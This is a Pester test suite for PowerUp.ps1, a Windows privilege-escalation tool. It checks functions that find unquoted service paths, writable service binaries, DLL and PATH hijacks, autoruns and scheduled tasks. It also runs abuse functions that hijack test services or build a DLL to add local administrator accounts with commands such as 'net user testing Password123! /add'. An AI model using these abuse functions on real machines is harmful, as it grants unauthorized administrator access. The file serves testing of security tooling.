Import-Module -Force "..\PowerUp.ps1"


function Get-RandomName {
    $r = 1..8 | ForEach-Object{Get-Random -max 26}
    return ('abcdefghijklmnopqrstuvwxyz'[$r] -join '')
}


########################################################
#
# Helpers
#
########################################################

Describe 'Get-ModifiableFile' {

    It 'Should output a file path.' {
        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
        $Null | Out-File -FilePath $FilePath -Force

        $Output = Get-ModifiableFile -Path $FilePath
        $Output | Should Be $FilePath

        Remove-Item -Path $FilePath -Force
    }

    It 'Should extract a modifiable file specified as an argument in a command string.' {
        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
        $Null | Out-File -FilePath $FilePath -Force

        $CmdPath = "'C:\Windows\System32\nonexistent.exe' -i '$FilePath'"
        
        $Output = Get-ModifiableFile -Path $FilePath
        $Output | Should Be $FilePath

        Remove-Item -Path $FilePath -Force
    }

    It 'Should return no results for a non-existent path.' {
        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"

        $Output = Get-ModifiableFile -Path $FilePath
        $Output | Should BeNullOrEmpty
    }

    It 'Should accept a Path over the pipeline.' {
        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"

        $Output = Get-ModifiableFile -Path $FilePath
        $Output | Should BeNullOrEmpty
    }
}


########################################################
#
# Service enumeration
#
########################################################

Describe 'Get-ServiceUnquoted' {

    It "Should not throw." {
        {Get-ServiceUnquoted} | Should Not Throw
    }

    It 'Should return service with a space in an unquoted binPath.' {
        $ServiceName = Get-RandomName
        $ServicePath = "C:\Program Files\service.exe"

        sc.exe create $ServiceName binPath= $ServicePath | Should Match "SUCCESS"
        Start-Sleep -Seconds 1

        $Output = Get-ServiceUnquoted | Where-Object { $_.ServiceName -eq $ServiceName }
        sc.exe delete $ServiceName | Should Match "SUCCESS"

        $Output | Should Not BeNullOrEmpty
        $Output.ServiceName | Should Be $ServiceName
        $Output.Path | Should Be $ServicePath
    }

    It 'Should not return services with a quoted binPath.' {
        $ServiceName = Get-RandomName
        $ServicePath = "'C:\Program Files\service.exe'"

        sc.exe create $ServiceName binPath= $ServicePath | Should Match "SUCCESS"
        Start-Sleep -Seconds 1

        $Output = Get-ServiceUnquoted | Where-Object { $_.ServiceName -eq $ServiceName }
        sc.exe delete $ServiceName | Should Match "SUCCESS"

        $Output | Should BeNullOrEmpty
    }
}


Describe 'Get-ServiceFilePermission' {

    It 'Should not throw.' {
        {Get-ServiceFilePermission} | Should Not Throw
    }

    It 'Should return a service with a modifiable service binary.' {
        $ServiceName = Get-RandomName
        $ServicePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())" + ".exe"
        $Null | Out-File -FilePath $ServicePath -Force

        sc.exe create $ServiceName binPath= $ServicePath | Should Match "SUCCESS"

        $Output = Get-ServiceFilePermission | Where-Object { $_.ServiceName -eq $ServiceName }
        sc.exe delete $ServiceName | Should Match "SUCCESS"
        Remove-Item -Path $ServicePath -Force

        $Output | Should Not BeNullOrEmpty
        $Output.ServiceName | Should Be $ServiceName
        $Output.Path | Should Be $ServicePath
    }

    It 'Should not return a service with a non-existent service binary.' {
        $ServiceName = Get-RandomName
        $ServicePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())" + ".exe"

        sc.exe create $ServiceName binPath= $ServicePath | Should Match "SUCCESS"

        $Output = Get-ServiceFilePermission | Where-Object { $_.ServiceName -eq $ServiceName }
        sc.exe delete $ServiceName | Should Match "SUCCESS"

        $Output | Should BeNullOrEmpty        
    }
}


Describe 'Get-ServicePermission' {

    It 'Should not throw.' {
        {Get-ServicePermission} | Should Not Throw
    }

    It 'Should return a modifiable service.' {
        $Output = Get-ServicePermission | Where-Object { $_.ServiceName -eq 'Dhcp'}
        $Output | Should Not BeNullOrEmpty
    }
}


Describe 'Get-ServiceDetail' {

    It 'Should return results for a valid service.' {
        $Output = Get-ServiceDetail -ServiceName Dhcp
        $Output | Should Not BeNullOrEmpty
    }

    It 'Should return not results for an invalid service.' {
        $Output = Get-ServiceDetail -ServiceName NonExistent123
        $Output | Should BeNullOrEmpty
    }
}



########################################################
#
# Service abuse
#
########################################################

Describe 'Invoke-ServiceAbuse' {
    
    BeforeEach {
        $ServicePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())" + ".exe"
        $Null = sc.exe create "PowerUpService" binPath= $ServicePath
    }

    AfterEach {
        $Null = sc.exe delete "PowerUpService"
        $Null = $(net user john /delete >$Null 2>&1)
    }

    It 'Should abuse a vulnerable service to add a local administrator with default options.' {
        $Output = Invoke-ServiceAbuse -ServiceName "PowerUpService"
        $Output.Command | Should Match "net"

        if( -not ($(net localgroup Administrators) -match "john")) {
            Throw "Local user 'john' not created."
        }
    }

    It 'Should accept a service name on the pipeline.' {
        $Output = "PowerUpService" | Invoke-ServiceAbuse
        $Output.Command | Should Match "net"

        if( -not ($(net localgroup Administrators) -match "john")) {
            Throw "Local user 'john' not created."
        }
    }

    It 'User should not be created for a non-existent service.' {
        $Output = Invoke-ServiceAbuse -ServiceName "NonExistentService456"
        $Output.Command | Should Match "Not found"

        if( ($(net localgroup Administrators) -match "john")) {
            Throw "Local user 'john' should not have been created for non-existent service."
        }
    }

    It 'Should accept custom user/password arguments.' {
        $Output = Invoke-ServiceAbuse -ServiceName "PowerUpService" -Username PowerUp -Password 'PASSword123!'
        $Output.Command | Should Match "net"

        if( -not ($(net localgroup Administrators) -match "PowerUp")) {
            Throw "Local user 'PowerUp' not created."
        }
        $Null = $(net user PowerUp /delete >$Null 2>&1)
    }

    It 'Should accept a custom command.' {
        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
        $Output = Invoke-ServiceAbuse -ServiceName "PowerUpService" -Command "net user testing Password123! /add"

        if( -not ($(net user) -match "testing")) {
            Throw "Custom command failed."
        }
        $Null = $(net user testing /delete >$Null 2>&1)
    }
}


Describe 'Install-ServiceBinary' {

    BeforeEach {
        $ServicePath = "$(Get-Location)\powerup.exe"
        $Null | Out-File -FilePath $ServicePath -Force
        $Null = sc.exe create "PowerUpService" binPath= $ServicePath
    }

    AfterEach {
        $Null = Invoke-ServiceStop -ServiceName PowerUpService
        $Null = sc.exe delete "PowerUpService"
        $Null = $(net user john /delete >$Null 2>&1)
        if(Test-Path "$(Get-Location)\powerup.exe") {
            Remove-Item -Path "$(Get-Location)\powerup.exe" -Force
        }
        if(Test-Path "$(Get-Location)\powerup.exe.bak") {
            Remove-Item -Path "$(Get-Location)\powerup.exe.bak" -Force
        }
    }

    It 'Should abuse a vulnerable service binary to add a local administrator with default options.' {

        $Output = Install-ServiceBinary -ServiceName "PowerUpService"
        $Output.Command | Should Match "net"

        $Null = Invoke-ServiceStart -ServiceName PowerUpService
        Start-Sleep -Seconds 3
        if( -not ($(net localgroup Administrators) -match "john")) {
            Throw "Local user 'john' not created."
        }
        $Null = Invoke-ServiceStop -ServiceName PowerUpService

        $Output = Restore-ServiceBinary -ServiceName PowerUpService
        "$(Get-Location)\powerup.exe.bak" | Should Not Exist
    }

    It 'Should accept a service name on the pipeline.' {

        $Output = "PowerUpService" | Install-ServiceBinary
        $Output.Command | Should Match "net"

        $Null = Invoke-ServiceStart -ServiceName PowerUpService
        Start-Sleep -Seconds 3
        if( -not ($(net localgroup Administrators) -match "john")) {
            Throw "Local user 'john' not created."
        }
        $Null = Invoke-ServiceStop -ServiceName PowerUpService

        $Output = Restore-ServiceBinary -ServiceName PowerUpService
        "$(Get-Location)\powerup.exe.bak" | Should Not Exist
    }

    It 'User should not be created for a non-existent service.' {
        $Output = Install-ServiceBinary -ServiceName "NonExistentService456"
        $Output.Command | Should Match "Not found"
    }

    It 'Should accept custom user/password arguments.' {
        $Output = Install-ServiceBinary -ServiceName "PowerUpService" -Username PowerUp -Password 'PASSword123!'
        $Output.Command | Should Match "net"

        $Null = Invoke-ServiceStart -ServiceName PowerUpService
        Start-Sleep -Seconds 3
        if( -not ($(net localgroup Administrators) -match "PowerUp")) {
            Throw "Local user 'PowerUp' not created."
        }
        $Null = $(net user PowerUp /delete >$Null 2>&1)

        $Output = Restore-ServiceBinary -ServiceName PowerUpService
        "$(Get-Location)\powerup.exe.bak" | Should Not Exist
    }

    It 'Should accept a custom command.' {

        $Output = Install-ServiceBinary -ServiceName "PowerUpService" -Command "net user testing Password123! /add"
        $Output.Command | Should Match "net"

        $Null = Invoke-ServiceStart -ServiceName PowerUpService
        Start-Sleep -Seconds 3
        if( -not ($(net user) -match "testing")) {
            Throw "Custom command failed."
        }
        $Null = $(net user testing /delete >$Null 2>&1)

        $Output = Restore-ServiceBinary -ServiceName PowerUpService
        "$(Get-Location)\powerup.exe.bak" | Should Not Exist
    }
}


########################################################
#
# .dll Hijacking
#
########################################################

Describe 'Find-DLLHijack' {
    It 'Should return results.' {
        $Output = Find-DLLHijack
        $Output | Should Not BeNullOrEmpty
    }
}


Describe 'Find-PathHijack' {

    It 'Should find a hijackable %PATH% folder.' {

        New-Item -Path C:\PowerUpTest\ -ItemType directory -Force

        $OldPath = $Env:PATH
        $Env:PATH += ';C:\PowerUpTest\'

        $Output = Find-PathHijack | Where-Object {$_.HijackablePath -like "*PowerUpTest*"}
        $Env:PATH = $OldPath
        $Output.HijackablePath | Should Be 'C:\PowerUpTest\'
    }
}

# won't actually execute on Win8+ with the wlbsctrl.dll method
Describe 'Write-HijackDll' {

    It 'Should write a .dll that executes a custom command.' {

        Write-HijackDll -OutputFile "$(Get-Location)\powerup.dll" -Command "net user testing Password123! /add"
        
        "$(Get-Location)\powerup.dll" | Should Exist
        "$(Get-Location)\debug.bat" | Should Exist
        Remove-Item -Path "$(Get-Location)\powerup.dll" -Force
        Remove-Item -Path "$(Get-Location)\debug.bat" -Force
    }
}


########################################################
#
# Registry Checks
#
########################################################

Describe 'Get-RegAlwaysInstallElevated' {
    It 'Should not throw.' {
        {Get-ServicePermission} | Should Not Throw
    }
}


Describe 'Get-RegAutoLogon' {
    It 'Should not throw.' {
        {Get-ServicePermission} | Should Not Throw
    }
}


Describe 'Get-VulnAutoRun' {
    It 'Should not throw.' {
        {Get-VulnAutoRun} | Should Not Throw
    }
    It 'Should find a vulnerable autorun.' {
        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
        $Null | Out-File -FilePath $FilePath -Force
        Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name PowerUp -Value "vuln.exe -i '$FilePath'"

        $Output = Get-VulnAutoRun | ?{$_.Path -like "*$FilePath*"}

        Remove-Item -Path $FilePath -Force
        $Null = Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name PowerUp
        
        $Output.ModifiableFile | Should Be $FilePath
    }    
}


########################################################
#
# Misc.
#
########################################################

Describe 'Get-VulnSchTask' {
    It 'Should not throw.' {
        {Get-VulnSchTask} | Should Not Throw
    }

    It 'Should find a vulnerable config file for a binary specified in a schtask.' {

        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
        $Null | Out-File -FilePath $FilePath -Force

        $Null = schtasks.exe /create /tn PowerUp /tr "vuln.exe -i '$FilePath'" /sc onstart /ru System /f

        $Output = Get-VulnSchTask | Where-Object {$_.TaskName -eq 'PowerUp'}
        $Null = schtasks.exe /delete /tn PowerUp /f
        Remove-Item -Path $FilePath -Force

        $Output.TaskFilePath | Should Be $FilePath
    }
}


Describe 'Get-UnattendedInstallFile' {
    It 'Should not throw.' {
        {Get-UnattendedInstallFile} | Should Not Throw
    }
    It 'Should return a leftover autorun' {
        $FilePath = Join-Path $Env:WinDir "\System32\Sysprep\unattend.xml"

        $Null | Out-File -FilePath $FilePath -Force
        $Output = Get-UnattendedInstallFile
        $Output | Should Not BeNullOrEmpty

        Remove-Item -Path $FilePath -Force
    }
}


Describe 'Get-Webconfig' {
    It 'Should not throw.' {
        {Get-Webconfig} | Should Not Throw
    }
}


Describe 'Get-ApplicationHost' {
    It 'Should not throw.' {
        {Get-ApplicationHost} | Should Not Throw
    }
}


Describe 'Invoke-AllChecks' {
    It 'Should return results to stdout.' {
        $Output = Invoke-AllChecks
        $Output | Should Not BeNullOrEmpty
    }
    It 'Should produce a HTML report with -HTMLReport.' {
        $Output = Invoke-AllChecks -HTMLReport
        $Output | Should Not BeNullOrEmpty

        $HtmlReportFile = "$($Env:ComputerName).$($Env:UserName).html"

        $HtmlReportFile | Should Exist
        Remove-Item -Path $HtmlReportFile -Force
    }
}
